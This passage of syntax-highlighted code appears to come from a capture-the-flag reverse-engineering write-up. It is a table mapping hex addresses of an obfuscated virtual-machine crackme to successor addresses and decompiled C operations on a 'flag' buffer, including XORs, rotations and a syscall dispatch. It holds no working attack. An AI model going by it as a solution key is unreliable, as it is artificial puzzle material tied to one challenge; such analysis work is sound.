rgb(255, 115, 253);">0x6d19</span>, <span style="color: rgb(255, 115, 253);">0x52ed</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x62f3</span>: ([<span style="color: rgb(255, 115, 253);">0x604e</span>, <span style="color: rgb(255, 115, 253);">0x6d19</span>, <span style="color: rgb(255, 115, 253);">0x604e</span>, <span style="color: rgb(255, 115, 253);">0x66a4</span>, <span style="color: rgb(255, 115, 253);">0x4f23</span>, <span style="color: rgb(255, 115, 253);">0x4570</span>, <span style="color: rgb(255, 115, 253);">0x4f23</span>, <span style="color: rgb(255, 115, 253);">0x2337</span>, <span style="color: rgb(255, 115, 253);">0x3b11</span>, <span style="color: rgb(255, 115, 253);">0x6fb6</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x66a4</span>: ([<span style="color: rgb(255, 115, 253);">0x6fb6</span>, <span style="color: rgb(255, 115, 253);">0x2db3</span>, <span style="color: rgb(255, 115, 253);">0x3b11</span>, <span style="color: rgb(255, 115, 253);">0x188f</span>, <span style="color: rgb(255, 115, 253);">0x4f23</span>, <span style="color: rgb(255, 115, 253);">0x464f</span>, <span style="color: rgb(255, 115, 253);">0x2db3</span>, <span style="color: rgb(255, 115, 253);">0x66a4</span>, <span style="color: rgb(255, 115, 253);">0x6d19</span>, <span style="color: rgb(255, 115, 253);">0x2db3</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x2db3</span>: ([<span style="color: rgb(255, 115, 253);">0x3b11</span>, <span style="color: rgb(255, 115, 253);">0x6df8</span>, <span style="color: rgb(255, 115, 253);">0x604e</span>, <span style="color: rgb(255, 115, 253);">0x464f</span>, <span style="color: rgb(255, 115, 253);">0x62f3</span>, <span style="color: rgb(255, 115, 253);">0x6d19</span>, <span style="color: rgb(255, 115, 253);">0x62f3</span>, <span style="color: rgb(255, 115, 253);">0x2db3</span>, <span style="color: rgb(255, 115, 253);">0x6df8</span>, <span style="color: rgb(255, 115, 253);">0x6d19</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x43c2</span>: ([<span style="color: rgb(255, 115, 253);">0x3137</span>, <span style="color: rgb(255, 115, 253);">0x5002</span>, <span style="color: rgb(255, 115, 253);">0x1b12</span>, <span style="color: rgb(255, 115, 253);">0x4a13</span>, <span style="color: rgb(255, 115, 253);">0x1b12</span>, <span style="color: rgb(255, 115, 253);">0x1bf1</span>, <span style="color: rgb(255, 115, 253);">0x7809</span>, <span style="color: rgb(255, 115, 253);">0x7809</span>, <span style="color: rgb(255, 115, 253);">0x4a13</span>, <span style="color: rgb(255, 115, 253);">0x679b</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x4a13</span>: ([<span style="color: rgb(255, 115, 253);">0x63d2</span>, <span style="color: rgb(255, 115, 253);">0x65c5</span>, <span style="color: rgb(255, 115, 253);">0x1b12</span>, <span style="color: rgb(255, 115, 253);">0x3058</span>, <span style="color: rgb(255, 115, 253);">0x68a6</span>, <span style="color: rgb(255, 115, 253);">0x3058</span>, <span style="color: rgb(255, 115, 253);">0x472e</span>, <span style="color: rgb(255, 115, 253);">0x3876</span>, <span style="color: rgb(255, 115, 253);">0x2cd4</span>, <span style="color: rgb(255, 115, 253);">0x4a13</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x3058</span>: ([<span style="color: rgb(255, 115, 253);">0x2cd4</span>, <span style="color: rgb(255, 115, 253);">0x5f5c</span>, <span style="color: rgb(255, 115, 253);">0x1bf1</span>, <span style="color: rgb(255, 115, 253);">0x472e</span>, <span style="color: rgb(255, 115, 253);">0x5aa9</span>, <span style="color: rgb(255, 115, 253);">0x6154</span>, <span style="color: rgb(255, 115, 253);">0x43c2</span>, <span style="color: rgb(255, 115, 253);">0x209a</span>, <span style="color: rgb(255, 115, 253);">0x2cd4</span>, <span style="color: rgb(255, 115, 253);">0x4e18</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x5aa9</span>: ([<span style="color: rgb(255, 115, 253);">0x1bf1</span>, <span style="color: rgb(255, 115, 253);">0x2cd4</span>, <span style="color: rgb(255, 115, 253);">0x6154</span>, <span style="color: rgb(255, 115, 253);">0x43c2</span>, <span style="color: rgb(255, 115, 253);">0x6df8</span>, <span style="color: rgb(255, 115, 253);">0x3216</span>, <span style="color: rgb(255, 115, 253);">0x2e92</span>, <span style="color: rgb(255, 115, 253);">0x6154</span>, <span style="color: rgb(255, 115, 253);">0x54ca</span>, <span style="color: rgb(255, 115, 253);">0x5676</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x3216</span>: ([<span style="color: rgb(255, 115, 253);">0x7375</span>, <span style="color: rgb(255, 115, 253);">0x3058</span>, <span style="color: rgb(255, 115, 253);">0x5aa9</span>, <span style="color: rgb(255, 115, 253);">0x5c94</span>, <span style="color: rgb(255, 115, 253);">0x12a8</span>, <span style="color: rgb(255, 115, 253);">0x78f1</span>, <span style="color: rgb(255, 115, 253);">0x65c5</span>, <span style="color: rgb(255, 115, 253);">0x11c9</span>, <span style="color: rgb(255, 115, 253);">0x5103</span>, <span style="color: rgb(255, 115, 253);">0x78f1</span>], <span style="color: rgb(168, 255, 96);">"  ++array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x7375</span>: ([<span style="color: rgb(255, 115, 253);">0x26a4</span>, <span style="color: rgb(255, 115, 253);">0x153a</span>, <span style="color: rgb(255, 115, 253);">0x7095</span>, <span style="color: rgb(255, 115, 253);">0x64d3</span>, <span style="color: rgb(255, 115, 253);">0x7375</span>, <span style="color: rgb(255, 115, 253);">0x3959</span>, <span style="color: rgb(255, 115, 253);">0x284a</span>, <span style="color: rgb(255, 115, 253);">0x7095</span>, <span style="color: rgb(255, 115, 253);">0x78f1</span>, <span style="color: rgb(255, 115, 253);">0x3bf0</span>], <span style="color: rgb(168, 255, 96);">"  ++r0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x26a4</span>: ([<span style="color: rgb(255, 115, 253);">0x5002</span>, <span style="color: rgb(255, 115, 253);">0x3725</span>, <span style="color: rgb(255, 115, 253);">0x2f84</span>, <span style="color: rgb(255, 115, 253);">0x5676</span>, <span style="color: rgb(255, 115, 253);">0x604e</span>, <span style="color: rgb(255, 115, 253);">0x62f3</span>, <span style="color: rgb(255, 115, 253);">0x2f84</span>, <span style="color: rgb(255, 115, 253);">0x5754</span>, <span style="color: rgb(255, 115, 253);">0x2bdd</span>, <span style="color: rgb(255, 115, 253);">0x3876</span>], <span style="color: rgb(168, 255, 96);">"  array[r0] = 0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x2f84</span>: ([<span style="color: rgb(255, 115, 253);">0x136e</span>, <span style="color: rgb(255, 115, 253);">0x1ee8</span>, <span style="color: rgb(255, 115, 253);">0x48fe</span>, <span style="color: rgb(255, 115, 253);">0x3959</span>, <span style="color: rgb(255, 115, 253);">0x5833</span>, <span style="color: rgb(255, 115, 253);">0x3565</span>, <span style="color: rgb(255, 115, 253);">0x3bf0</span>, <span style="color: rgb(255, 115, 253);">0x2f84</span>, <span style="color: rgb(255, 115, 253);">0x3959</span>, <span style="color: rgb(255, 115, 253);">0x724c</span>], <span style="color: rgb(168, 255, 96);">"  ++r0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x136e</span>: ([<span style="color: rgb(255, 115, 253);">0x2a19</span>, <span style="color: rgb(255, 115, 253);">0x5f5c</span>, <span style="color: rgb(255, 115, 253);">0x17be</span>, <span style="color: rgb(255, 115, 253);">0x42fc</span>, <span style="color: rgb(255, 115, 253);">0x3959</span>, <span style="color: rgb(255, 115, 253);">0x78f1</span>, <span style="color: rgb(255, 115, 253);">0x3e48</span>, <span style="color: rgb(255, 115, 253);">0x3bf0</span>, <span style="color: rgb(255, 115, 253);">0x2771</span>, <span style="color: rgb(255, 115, 253);">0x3725</span>], <span style="color: rgb(168, 255, 96);">"  *((_BYTE *)&amp;flag + (unsigned __int8)r1) ^= array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x2a19</span>: ([<span style="color: rgb(255, 115, 253);">0x3bf0</span>, <span style="color: rgb(255, 115, 253);">0x209a</span>, <span style="color: rgb(255, 115, 253);">0x65c5</span>, <span style="color: rgb(255, 115, 253);">0x3bf0</span>, <span style="color: rgb(255, 115, 253);">0x3bf0</span>, <span style="color: rgb(255, 115, 253);">0x24db</span>, <span style="color: rgb(255, 115, 253);">0x7095</span>, <span style="color: rgb(255, 115, 253);">0x78f1</span>, <span style="color: rgb(255, 115, 253);">0x17be</span>, <span style="color: rgb(255, 115, 253);">0x7095</span>], <span style="color: rgb(168, 255, 96);">"  *((_BYTE *)&amp;flag + (unsigned __int8)r1) = array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x3bf0</span>: ([<span style="color: rgb(255, 115, 253);">0x5754</span>, <span style="color: rgb(255, 115, 253);">0x3d82</span>, <span style="color: rgb(255, 115, 253);">0x3d82</span>, <span style="color: rgb(255, 115, 253);">0x40cb</span>, <span style="color: rgb(255, 115, 253);">0x464f</span>, <span style="color: rgb(255, 115, 253);">0x3959</span>, <span style="color: rgb(255, 115, 253);">0x6df8</span>, <span style="color: rgb(255, 115, 253);">0x3d82</span>, <span style="color: rgb(255, 115, 253);">0x5754</span>, <span style="color: rgb(255, 115, 253);">0x481b</span>], <span style="color: rgb(168, 255, 96);">"  array[r0] = 0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x481b</span>: ([<span style="color: rgb(255, 115, 253);">0x48fe</span>, <span style="color: rgb(255, 115, 253);">0x340a</span>, <span style="color: rgb(255, 115, 253);">0x5676</span>, <span style="color: rgb(255, 115, 253);">0x5754</span>, <span style="color: rgb(255, 115, 253);">0x6ed7</span>, <span style="color: rgb(255, 115, 253);">0x5d6d</span>, <span style="color: rgb(255, 115, 253);">0x153a</span>, <span style="color: rgb(255, 115, 253);">0x3cbc</span>, <span style="color: rgb(255, 115, 253);">0x6df8</span>, <span style="color: rgb(255, 115, 253);">0x2f84</span>], <span style="color: rgb(168, 255, 96);">"  ++r0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x48fe</span>: ([<span style="color: rgb(255, 115, 253);">0x1fb5</span>, <span style="color: rgb(255, 115, 253);">0x2771</span>, <span style="color: rgb(255, 115, 253);">0x241a</span>, <span style="color: rgb(255, 115, 253);">0x44aa</span>, <span style="color: rgb(255, 115, 253);">0x1fb5</span>, <span style="color: rgb(255, 115, 253);">0x12a8</span>, <span style="color: rgb(255, 115, 253);">0x5d6d</span>, <span style="color: rgb(255, 115, 253);">0x5d6d</span>, <span style="color: rgb(255, 115, 253);">0x5d6d</span>, <span style="color: rgb(255, 115, 253);">0x5baf</span>], <span style="color: rgb(168, 255, 96);">"  *((_BYTE *)&amp;flag + (unsigned __int8)r1) ^= array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x1fb5</span>: ([<span style="color: rgb(255, 115, 253);">0x65c5</span>, <span style="color: rgb(255, 115, 253);">0x2425</span>, <span style="color: rgb(255, 115, 253);">0x69b1</span>, <span style="color: rgb(255, 115, 253);">0x6d19</span>, <span style="color: rgb(255, 115, 253);">0x464f</span>, <span style="color: rgb(255, 115, 253);">0x241a</span>, <span style="color: rgb(255, 115, 253);">0x5676</span>, <span style="color: rgb(255, 115, 253);">0x153a</span>, <span style="color: rgb(255, 115, 253);">0x2425</span>, <span style="color: rgb(255, 115, 253);">0x3e48</span>], <span style="color: rgb(168, 255, 96);">"  array[r0] = *((_BYTE *)&amp;flag + (unsigned __int8)r1);"</span>),<br /><span style="color: rgb(255, 115, 253);">0x2425</span>: ([<span style="color: rgb(255, 115, 253);">0x2cd4</span>, <span style="color: rgb(255, 115, 253);">0x2f84</span>, <span style="color: rgb(255, 115, 253);">0x3308</span>, <span style="color: rgb(255, 115, 253);">0x3308</span>, <span style="color: rgb(255, 115, 253);">0x48fe</span>, <span style="color: rgb(255, 115, 253);">0x2a19</span>, <span style="color: rgb(255, 115, 253);">0x48fe</span>, <span style="color: rgb(255, 115, 253);">0x2a19</span>, <span style="color: rgb(255, 115, 253);">0x3308</span>, <span style="color: rgb(255, 115, 253);">0x2a19</span>], <span style="color: rgb(168, 255, 96);">"  ++r1;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x3308</span>: ([<span style="color: rgb(255, 115, 253);">0x62f3</span>, <span style="color: rgb(255, 115, 253);">0x724c</span>, <span style="color: rgb(255, 115, 253);">0x5d6d</span>, <span style="color: rgb(255, 115, 253);">0x5676</span>, <span style="color: rgb(255, 115, 253);">0x3e48</span>, <span style="color: rgb(255, 115, 253);">0x3e48</span>, <span style="color: rgb(255, 115, 253);">0x5d6d</span>, <span style="color: rgb(255, 115, 253);">0x6154</span>, <span style="color: rgb(255, 115, 253);">0x1fb5</span>, <span style="color: rgb(255, 115, 253);">0x5d6d</span>], <span style="color: rgb(168, 255, 96);">"  *((_BYTE *)&amp;flag + (unsigned __int8)r1) ^= array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x724c</span>: ([<span style="color: rgb(255, 115, 253);">0x16f8</span>, <span style="color: rgb(255, 115, 253);">0x64d3</span>, <span style="color: rgb(255, 115, 253);">0x2425</span>, <span style="color: rgb(255, 115, 253);">0x7717</span>, <span style="color: rgb(255, 115, 253);">0x2bdd</span>, <span style="color: rgb(255, 115, 253);">0x3959</span>, <span style="color: rgb(255, 115, 253);">0x4d52</span>, <span style="color: rgb(255, 115, 253);">0x78f1</span>, <span style="color: rgb(255, 115, 253);">0x2425</span>, <span style="color: rgb(255, 115, 253);">0x2b07</span>], <span style="color: rgb(168, 255, 96);">"  *((_BYTE *)&amp;flag + (unsigned __int8)r1) ^= array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x64d3</span>: ([<span style="color: rgb(255, 115, 253);">0x3308</span>, <span style="color: rgb(255, 115, 253);">0x5d6d</span>, <span style="color: rgb(255, 115, 253);">0x3d82</span>, <span style="color: rgb(255, 115, 253);">0x26a4</span>, <span style="color: rgb(255, 115, 253);">0x724c</span>, <span style="color: rgb(255, 115, 253);">0x209a</span>, <span style="color: rgb(255, 115, 253);">0x51ff</span>, <span style="color: rgb(255, 115, 253);">0x5002</span>, <span style="color: rgb(255, 115, 253);">0x5676</span>, <span style="color: rgb(255, 115, 253);">0x724c</span>], <span style="color: rgb(168, 255, 96);">"  ++r0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x5d6d</span>: ([<span style="color: rgb(255, 115, 253);">0x2425</span>, <span style="color: rgb(255, 115, 253);">0x3e48</span>, <span style="color: rgb(255, 115, 253);">0x3e48</span>, <span style="color: rgb(255, 115, 253);">0x55a9</span>, <span style="color: rgb(255, 115, 253);">0x5676</span>, <span style="color: rgb(255, 115, 253);">0x3e48</span>, <span style="color: rgb(255, 115, 253);">0x2a19</span>, <span style="color: rgb(255, 115, 253);">0x3e48</span>, <span style="color: rgb(255, 115, 253);">0x2425</span>, <span style="color: rgb(255, 115, 253);">0x3e48</span>], <span style="color: rgb(168, 255, 96);">"  array[r0] = *((_BYTE *)&amp;flag + (unsigned __int8)r1);"</span>),<br /><span style="color: rgb(255, 115, 253);">0x3e48</span>: ([<span style="color: rgb(255, 115, 253);">0x25b1</span>, <span style="color: rgb(255, 115, 253);">0x2a19</span>, <span style="color: rgb(255, 115, 253);">0x48fe</span>, <span style="color: rgb(255, 115, 253);">0x48fe</span>, <span style="color: rgb(255, 115, 253);">0x48fe</span>, <span style="color: rgb(255, 115, 253);">0x2a19</span>, <span style="color: rgb(255, 115, 253);">0x48fe</span>, <span style="color: rgb(255, 115, 253);">0x2a19</span>, <span style="color: rgb(255, 115, 253);">0x3308</span>, <span style="color: rgb(255, 115, 253);">0x48fe</span>], <span style="color: rgb(168, 255, 96);">"  ++r1;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x5676</span>: ([<span style="color: rgb(255, 115, 253);">0x2b07</span>, <span style="color: rgb(255, 115, 253);">0x1ee8</span>, <span style="color: rgb(255, 115, 253);">0x24db</span>, <span style="color: rgb(255, 115, 253);">0x3d82</span>, <span style="color: rgb(255, 115, 253);">0x7095</span>, <span style="color: rgb(255, 115, 253);">0x5833</span>, <span style="color: rgb(255, 115, 253);">0x24db</span>, <span style="color: rgb(255, 115, 253);">0x7095</span>, <span style="color: rgb(255, 115, 253);">0x7375</span>, <span style="color: rgb(255, 115, 253);">0x3308</span>], <span style="color: rgb(168, 255, 96);">"  ++r0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x1ee8</span>: ([<span style="color: rgb(255, 115, 253);">0x2337</span>, <span style="color: rgb(255, 115, 253);">0x6a77</span>, <span style="color: rgb(255, 115, 253);">0x7375</span>, <span style="color: rgb(255, 115, 253);">0x196d</span>, <span style="color: rgb(255, 115, 253);">0x3a4b</span>, <span style="color: rgb(255, 115, 253);">0x65c5</span>, <span style="color: rgb(255, 115, 253);">0x679b</span>, <span style="color: rgb(255, 115, 253);">0x63d2</span>, <span style="color: rgb(255, 115, 253);">0x7717</span>, <span style="color: rgb(255, 115, 253);">0x7462</span>], <span style="color: rgb(168, 255, 96);">"  array[r0] = 0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x6a77</span>: ([<span style="color: rgb(255, 115, 253);">0x24db</span>, <span style="color: rgb(255, 115, 253);">0x5aa9</span>, <span style="color: rgb(255, 115, 253);">0x51ff</span>, <span style="color: rgb(255, 115, 253);">0x284a</span>, <span style="color: rgb(255, 115, 253);">0x5927</span>, <span style="color: rgb(255, 115, 253);">0x481b</span>, <span style="color: rgb(255, 115, 253);">0x241a</span>, <span style="color: rgb(255, 115, 253);">0x5baf</span>, <span style="color: rgb(255, 115, 253);">0x6154</span>, <span style="color: rgb(255, 115, 253);">0x40cb</span>], <span style="color: rgb(168, 255, 96);">"  *((_BYTE *)&amp;flag + (unsigned __int8)r1) = ((int)*((unsigned __int8 *)&amp;flag + (unsigned __int8)r1) &gt;&gt; array[r0]) | (*((_BYTE *)&amp;flag + (unsigned __int8)r1) &lt;&lt; (8 - array[r0]));"</span>),<br /><span style="color: rgb(255, 115, 253);">0x51ff</span>: ([<span style="color: rgb(255, 115, 253);">0x26a4</span>, <span style="color: rgb(255, 115, 253);">0x55a9</span>, <span style="color: rgb(255, 115, 253);">0x53cc</span>, <span style="color: rgb(255, 115, 253);">0x5e5b</span>, <span style="color: rgb(255, 115, 253);">0x51ff</span>, <span style="color: rgb(255, 115, 253);">0x24db</span>, <span style="color: rgb(255, 115, 253);">0x26a4</span>, <span style="color: rgb(255, 115, 253);">0x4e18</span>, <span style="color: rgb(255, 115, 253);">0x5d6d</span>, <span style="color: rgb(255, 115, 253);">0x2b07</span>], <span style="color: rgb(168, 255, 96);">"  if ( (char)array[r0] &lt; 0 ) rand();"</span>),<br /><span style="color: rgb(255, 115, 253);">0x284a</span>: ([<span style="color: rgb(255, 115, 253);">0x5676</span>, <span style="color: rgb(255, 115, 253);">0x5e5b</span>, <span style="color: rgb(255, 115, 253);">0x7375</span>, <span style="color: rgb(255, 115, 253);">0x464f</span>, <span style="color: rgb(255, 115, 253);">0x4570</span>, <span style="color: rgb(255, 115, 253);">0x69b1</span>, <span style="color: rgb(255, 115, 253);">0x7717</span>, <span style="color: rgb(255, 115, 253);">0x1b12</span>, <span style="color: rgb(255, 115, 253);">0x3f0e</span>, <span style="color: rgb(255, 115, 253);">0x2337</span>], <span style="color: rgb(168, 255, 96);">"  array[r0] = 0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x69b1</span>: ([<span style="color: rgb(255, 115, 253);">0x78f1</span>, <span style="color: rgb(255, 115, 253);">0x153a</span>, <span style="color: rgb(255, 115, 253);">0x3d82</span>, <span style="color: rgb(255, 115, 253);">0x6ed7</span>, <span style="color: rgb(255, 115, 253);">0x42fc</span>, <span style="color: rgb(255, 115, 253);">0x44aa</span>, <span style="color: rgb(255, 115, 253);">0x7809</span>, <span style="color: rgb(255, 115, 253);">0x2cd4</span>, <span style="color: rgb(255, 115, 253);">0x51ff</span>, <span style="color: rgb(255, 115, 253);">0x44aa</span>], <span style="color: rgb(168, 255, 96);">"  --r1;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x78f1</span>: ([<span style="color: rgb(255, 115, 253);">0x7638</span>, <span style="color: rgb(255, 115, 253);">0x5002</span>, <span style="color: rgb(255, 115, 253);">0x41aa</span>, <span style="color: rgb(255, 115, 253);">0x3876</span>, <span style="color: rgb(255, 115, 253);">0x1a4c</span>, <span style="color: rgb(255, 115, 253);">0x51ff</span>, <span style="color: rgb(255, 115, 253);">0x3cbc</span>, <span style="color: rgb(255, 115, 253);">0x7717</span>, <span style="color: rgb(255, 115, 253);">0x2f84</span>, <span style="color: rgb(255, 115, 253);">0x26a4</span>], <span style="color: rgb(168, 255, 96);">"  array[r0] = 0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x7638</span>: ([<span style="color: rgb(255, 115, 253);">0x5aa9</span>, <span style="color: rgb(255, 115, 253);">0x44aa</span>, <span style="color: rgb(255, 115, 253);">0x464f</span>, <span style="color: rgb(255, 115, 253);">0x3876</span>, <span style="color: rgb(255, 115, 253);">0x2a19</span>, <span style="color: rgb(255, 115, 253);">0x3137</span>, <span style="color: rgb(255, 115, 253);">0x3d82</span>, <span style="color: rgb(255, 115, 253);">0x2337</span>, <span style="color: rgb(255, 115, 253);">0x2261</span>, <span style="color: rgb(255, 115, 253);">0x48fe</span>], <span style="color: rgb(168, 255, 96);">"  --array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x44aa</span>: ([<span style="color: rgb(255, 115, 253);">0x44aa</span>, <span style="color: rgb(255, 115, 253);">0x44aa</span>, <span style="color: rgb(255, 115, 253);">0x44aa</span>, <span style="color: rgb(255, 115, 253);">0x5c94</span>, <span style="color: rgb(255, 115, 253);">0x69b1</span>, <span style="color: rgb(255, 115, 253);">0x5d6d</span>, <span style="color: rgb(255, 115, 253);">0x44aa</span>, <span style="color: rgb(255, 115, 253);">0x69b1</span>, <span style="color: rgb(255, 115, 253);">0x44aa</span>, <span style="color: rgb(255, 115, 253);">0x44aa</span>], <span style="color: rgb(168, 255, 96);">"  --r1;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x2261</span>: ([<span style="color: rgb(255, 115, 253);">0x7095</span>, <span style="color: rgb(255, 115, 253);">0x17be</span>, <span style="color: rgb(255, 115, 253);">0x7095</span>, <span style="color: rgb(255, 115, 253);">0x26a4</span>, <span style="color: rgb(255, 115, 253);">0x284a</span>, <span style="color: rgb(255, 115, 253);">0x3bf0</span>, <span style="color: rgb(255, 115, 253);">0x24db</span>, <span style="color: rgb(255, 115, 253);">0x55a9</span>, <span style="color: rgb(255, 115, 253);">0x6bc8</span>, <span style="color: rgb(255, 115, 253);">0x24db</span>], <span style="color: rgb(168, 255, 96);">"  if ( (char)array[r0] &lt; 0 ) rand();"</span>),<br /><span style="color: rgb(255, 115, 253);">0x7095</span>: ([<span style="color: rgb(255, 115, 253);">0x4570</span>, <span style="color: rgb(255, 115, 253);">0x7717</span>, <span style="color: rgb(255, 115, 253);">0x7375</span>, <span style="color: rgb(255, 115, 253);">0x7717</span>, <span style="color: rgb(255, 115, 253);">0x63d2</span>, <span style="color: rgb(255, 115, 253);">0x4f23</span>, <span style="color: rgb(255, 115, 253);">0x65c5</span>, <span style="color: rgb(255, 115, 253);">0x5754</span>, <span style="color: rgb(255, 115, 253);">0x7717</span>, <span style="color: rgb(255, 115, 253);">0x3959</span>], <span style="color: rgb(168, 255, 96);">"  array[r0] = 0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x7717</span>: ([<span style="color: rgb(255, 115, 253);">0x17be</span>, <span style="color: rgb(255, 115, 253);">0x1cd0</span>, <span style="color: rgb(255, 115, 253);">0x3565</span>, <span style="color: rgb(255, 115, 253);">0x2261</span>, <span style="color: rgb(255, 115, 253);">0x3565</span>, <span style="color: rgb(255, 115, 253);">0x5c94</span>, <span style="color: rgb(255, 115, 253);">0x43c2</span>, <span style="color: rgb(255, 115, 253);">0x2261</span>, <span style="color: rgb(255, 115, 253);">0x2261</span>, <span style="color: rgb(255, 115, 253);">0x3565</span>], <span style="color: rgb(168, 255, 96);">"  --array[r0];"</span>),<br /><span style="color: rgb(255, 115, 253);">0x17be</span>: ([<span style="color: rgb(255, 115, 253);">0x7717</span>, <span style="color: rgb(255, 115, 253);">0x2425</span>, <span style="color: rgb(255, 115, 253);">0x64d3</span>, <span style="color: rgb(255, 115, 253);">0x284a</span>, <span style="color: rgb(255, 115, 253);">0x2db3</span>, <span style="color: rgb(255, 115, 253);">0x5002</span>, <span style="color: rgb(255, 115, 253);">0x1ee8</span>, <span style="color: rgb(255, 115, 253);">0x6df8</span>, <span style="color: rgb(255, 115, 253);">0x6ed7</span>, <span style="color: rgb(255, 115, 253);">0x2db3</span>], <span style="color: rgb(168, 255, 96);">"  array[r0] = 0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x3565</span>: ([<span style="color: rgb(255, 115, 253);">0x55a9</span>, <span style="color: rgb(255, 115, 253);">0x16f8</span>, <span style="color: rgb(255, 115, 253);">0x6df8</span>, <span style="color: rgb(255, 115, 253);">0x48fe</span>, <span style="color: rgb(255, 115, 253);">0x62f3</span>, <span style="color: rgb(255, 115, 253);">0x6bc8</span>, <span style="color: rgb(255, 115, 253);">0x55a9</span>, <span style="color: rgb(255, 115, 253);">0x2f84</span>, <span style="color: rgb(255, 115, 253);">0x17be</span>, <span style="color: rgb(255, 115, 253);">0x363b</span>], <span style="color: rgb(168, 255, 96);">"  if ( (char)array[r0] &lt; 0 ) rand();"</span>),<br /><span style="color: rgb(255, 115, 253);">0x363b</span>: ([<span style="color: rgb(255, 115, 253);">0x2771</span>, <span style="color: rgb(255, 115, 253);">0x209a</span>, <span style="color: rgb(255, 115, 253);">0x2917</span>, <span style="color: rgb(255, 115, 253);">0x3565</span>, <span style="color: rgb(255, 115, 253);">0x1b12</span>, <span style="color: rgb(255, 115, 253);">0x1b12</span>, <span style="color: rgb(255, 115, 253);">0x5676</span>, <span style="color: rgb(255, 115, 253);">0x6fb6</span>, <span style="color: rgb(255, 115, 253);">0x5754</span>, <span style="color: rgb(255, 115, 253);">0x41aa</span>], <span style="color: rgb(168, 255, 96);">"  array[r0] = 0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x2771</span>: ([<span style="color: rgb(255, 115, 253);">0x4f23</span>, <span style="color: rgb(255, 115, 253);">0x24db</span>, <span style="color: rgb(255, 115, 253);">0x6a77</span>, <span style="color: rgb(255, 115, 253);">0x25b1</span>, <span style="color: rgb(255, 115, 253);">0x40cb</span>, <span style="color: rgb(255, 115, 253);">0x25b1</span>, <span style="color: rgb(255, 115, 253);">0x2a19</span>, <span style="color: rgb(255, 115, 253);">0x2db3</span>, <span style="color: rgb(255, 115, 253);">0x679b</span>, <span style="color: rgb(255, 115, 253);">0x12a8</span>], <span style="color: rgb(168, 255, 96);">"  ++r1;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x12a8</span>: ([<span style="color: rgb(255, 115, 253);">0x1cd0</span>, <span style="color: rgb(255, 115, 253);">0x3725</span>, <span style="color: rgb(255, 115, 253);">0x65c5</span>, <span style="color: rgb(255, 115, 253);">0x17be</span>, <span style="color: rgb(255, 115, 253);">0x7375</span>, <span style="color: rgb(255, 115, 253);">0x2db3</span>, <span style="color: rgb(255, 115, 253);">0x2a19</span>, <span style="color: rgb(255, 115, 253);">0x604e</span>, <span style="color: rgb(255, 115, 253);">0x1b12</span>, <span style="color: rgb(255, 115, 253);">0x2425</span>], <span style="color: rgb(168, 255, 96);">"  ++r1;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x41aa</span>: ([<span style="color: rgb(255, 115, 253);">0x1cd0</span>, <span style="color: rgb(255, 115, 253);">0x3565</span>, <span style="color: rgb(255, 115, 253);">0x6d19</span>, <span style="color: rgb(255, 115, 253);">0x2f84</span>, <span style="color: rgb(255, 115, 253);">0x3137</span>, <span style="color: rgb(255, 115, 253);">0x2261</span>, <span style="color: rgb(255, 115, 253);">0x1cd0</span>, <span style="color: rgb(255, 115, 253);">0x481b</span>, <span style="color: rgb(255, 115, 253);">0x66a4</span>, <span style="color: rgb(255, 115, 253);">0x3137</span>], <span style="color: rgb(168, 255, 96);">"  array[r0] = syscall((char)array[r0], (unsigned int)(char)array[r0 + 1], &amp;array[r0 + 2], (unsigned int)(char)array[r0 + 3]);"</span>),<br /><span style="color: rgb(255, 115, 253);">0x1a4c</span>: ([<span style="color: rgb(255, 115, 253);">0x1e22</span>, <span style="color: rgb(255, 115, 253);">0x41aa</span>, <span style="color: rgb(255, 115, 253);">0x6233</span>, <span style="color: rgb(255, 115, 253);">0x1e22</span>, <span style="color: rgb(255, 115, 253);">0x340a</span>, <span style="color: rgb(255, 115, 253);">0x16f8</span>, <span style="color: rgb(255, 115, 253);">0x1a4c</span>, <span style="color: rgb(255, 115, 253);">0x6233</span>, <span style="color: rgb(255, 115, 253);">0x6233</span>, <span style="color: rgb(255, 115, 253);">0x16f8</span>], <span style="color: rgb(168, 255, 96);">"  --r0;"</span>),<br /><span style="color: rgb(255, 115, 253);">0x1e22</span>: ([<span style="color: rgb(255, 115, 253);">0x1a4c</span>, <span style="color: rgb(255, 115, 253);">0x4a13</span>, <span style="color: 